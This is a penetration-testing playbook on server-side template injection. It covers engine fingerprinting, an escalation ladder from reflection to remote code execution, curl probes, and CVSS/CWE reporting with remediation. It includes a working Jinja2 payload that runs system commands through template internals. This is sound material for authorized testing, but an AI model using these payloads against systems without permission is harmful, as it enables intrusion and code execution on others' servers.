# Offensive Playbook: Server-Side Template Injection (SSTI)

## 1. Overview & Attack Surface
SSTI occurs when user input is embedded in a server-side template (Twig, Jinja2,
Smarty, Freemarker, Velocity, ERB, Handlebars) and evaluated — escalating from
reflected output to full RCE via template engine internals.

## 2. Classification & Detection
### A. Engine fingerprint polyglot
Submit `${{<%[%'"}}%\.` and read the error/output to identify the engine:
- `{{7*7}}` → `49` = Jinja2/Twig/Handlebars family.
- `${7*7}` → `49` = Freemarker/Velocity/EL family.
- `<%= 7*7 %>` → `49` = ERB/Smarty family.

### B. Escalation ladder (prove IMPACT, not just reflection)
1. Reflection (`49`) = Probable only.
2. Object traversal: `{{self}}`, `{{config}}`, `{{request}}` — information disclosure.
3. RCE: Jinja2 `{{self.__init__.__globals__.os.popen('id').read()}}`;
   Twig `{{_self.env.registerUndefinedFilterCallback(...)}}` chain. Use harmless
   `id`/`whoami` only — never destructive commands.

### C. Common sinks
Profile names, email templates, error pages echoing input, PDF/report generators,
CMS themes, marketing-page builders.

## 3. Sandbox Automated Validation
```bash
curl -s "TARGET/profile?name={{7*7}}" | grep -o '49\|7\*7' | head -n 3
curl -s "TARGET/profile?name=\${7*7}" | grep -o '49' | head -n 3
```

## 4. Verification & Reporting
1. `49` rendering = engine evaluates input (Probable). `id`-output via traversal
   chain = Confirmed RCE.
2. File finding via `create_vulnerability_report`:
   - **Category**: Server-Side Template Injection (OWASP A03:2021)
   - **CWE**: CWE-1336 (Improper Neutralization of Template Placeholders)
   - **CVSS 3.1**: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (Base 9.8 Critical for RCE; 7.5 High for reflection-only)
   - **Remediation**: Never interpolate user input into templates (logic-less
     templates / explicit context objects), sandbox the engine, least privilege.
